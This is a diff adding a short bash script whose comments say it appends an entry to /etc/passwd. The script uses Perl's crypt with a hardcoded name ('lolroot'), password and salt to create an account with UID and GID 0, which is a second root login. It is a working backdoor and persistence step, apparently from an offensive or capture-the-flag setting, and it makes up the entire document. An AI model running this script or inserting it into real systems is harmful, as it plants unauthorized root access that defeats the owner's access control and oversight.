@@ -1,0 +1,11 @@
+#!/bin/bash
+# adds new entry to /etc/passwd
+# Default name is lolroot, password = getshrektm8
+# entries are of form:
+#    name:password(salted):UID:GID:uid info/comment:homedir:command/shell
+
+export NAME="lolroot"
+export PASSWD="getshrektm8"
+export SALT="xx"
+
+perl -e 'print "$ENV{NAME}:" . crypt($ENV{PASSWD}, $ENV{SALT}) . ":0:0:/root:/bin/bash\n"' >> /etc/passwd
